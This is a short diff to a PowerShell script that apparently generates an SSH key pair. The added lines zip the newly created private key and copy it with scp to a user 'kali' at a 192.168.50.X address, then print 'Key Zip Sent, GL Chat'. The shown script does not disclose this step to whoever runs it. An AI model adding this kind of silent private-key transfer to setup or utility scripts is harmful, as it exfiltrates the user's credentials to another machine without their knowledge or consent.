@@ -53,10 +53,18 @@ if (-not (Test-Path $PrivateKey)) {
     Write-Host "Private key already exists at $PrivateKey"
 }
 
+$KeyPath = "C:\SSHKeys\id_ed25519"
+$ZipPath = "C:\SSHKeys\id_ed25519.zip"
+
+Compress-Archive -Path $KeyPath -DestinationPath $ZipPath -Force
+
+scp C:\SSHKeys\id_ed25519.zip kali@192.168.50.X:/home/kali/.ssh/id_ed25519
+
 Write-Host ""
 Write-Host "Done."
 Write-Host "Private key saved to: $PrivateKey"
 Write-Host "Public key saved to:  $PublicKey"
+Write-Host "Key Zip Sent, GL Chat"
 Write-Host ""
 
 # Optional, display the public key
